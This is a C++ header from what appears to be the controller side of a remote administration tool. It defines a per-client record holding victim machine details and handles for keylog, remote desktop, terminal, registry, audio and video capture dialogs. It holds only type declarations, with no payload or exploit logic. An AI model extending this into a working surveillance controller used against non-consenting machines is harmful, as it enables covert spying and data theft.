#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <basetsd.h>
#include <mmsystem.h>
#include <cstdint>
#include <string>
#include <vector>
#include "Config.h"

#pragma comment(lib, "winmm.lib")

// HPSocket连接ID类型定义
typedef ULONG_PTR CONNID;

// 前向声明 Formidable 命名空间类型
namespace Formidable {
    struct ClientInfo;
    struct CommandPkg;
    struct PkgHeader;
}

namespace Formidable {

// 列表排序信息
struct ListViewSortInfo {
    int column;
    bool ascending;
    HWND hwndList;
};

// 已连接客户端结构
struct ConnectedClient {
    uint32_t clientId;
    CONNID connId;
    std::string ip;
    uint16_t port;
    bool active;
    uint64_t lastHeartbeat;
    uint64_t lastHeartbeatSendTime;

    // 客户端信息
    ClientInfo info;
    char computerName[64];
    char userName[64];
    char osVersion[128];
    char cpuName[64];
    char clientIp[64];
    uint32_t ram;
    char videoCard[128];
    char macAddress[32];
    uint32_t screen_width;
    uint32_t screen_height;
    char location[128];
    int listIndex; // ListView index in master UI
    
    // 群控功能字段
    std::wstring remark;  // 备注信息
    std::wstring group;   // 分组名称

    // 窗口句柄
    HWND hProcessDlg;
    HWND hModuleDlg;
    HWND hTerminalDlg;
    HWND hServiceDlg;
    HWND hRegistryDlg;
    HWND hDesktopDlg;
    HWND hWindowDlg;
    HWND hFileDlg;
    HWND hKeylogDlg;
    HWND hAudioDlg;  // 添加音频窗口
    HWND hVideoDlg;  // 添加视频窗口

    // 桌面监控标志
    bool isMonitoring;

    // 接收缓冲区
    std::vector<BYTE> recvBuffer;

    // 文件传输
    HANDLE hFileDownload; // 使用Win32 HANDLE以便于跨线程/复杂操作
    std::wstring downloadPath;

    // 音频播放 (Master端使用)
    HWAVEOUT hWaveOut;
    void* pAudioDecoder;  // FFmpeg AVCodecContext* 用于 MP3 解码

    ConnectedClient() : clientId(0), connId(0), port(0), active(false), 
                        lastHeartbeat(0), ram(0), screen_width(0), screen_height(0),
                        hProcessDlg(NULL), hModuleDlg(NULL), hTerminalDlg(NULL),
                        hServiceDlg(NULL), hRegistryDlg(NULL), hDesktopDlg(NULL),
                        hWindowDlg(NULL), hFileDlg(NULL), hKeylogDlg(NULL),
                        hAudioDlg(NULL), hVideoDlg(NULL),
                        isMonitoring(false), info{}, listIndex(-1),
                        hFileDownload(INVALID_HANDLE_VALUE),
                        hWaveOut(NULL), pAudioDecoder(NULL) {
        memset(computerName, 0, sizeof(computerName));
        memset(userName, 0, sizeof(userName));
        memset(osVersion, 0, sizeof(osVersion));
        memset(cpuName, 0, sizeof(cpuName));
        memset(clientIp, 0, sizeof(clientIp));
        memset(videoCard, 0, sizeof(videoCard));
        memset(macAddress, 0, sizeof(macAddress));
        memset(location, 0, sizeof(location));
    }
};

// ProcessInfo and ModuleInfo moved to Config.h to avoid redefinition
// Check Config.h for definitions

} // namespace Formidable
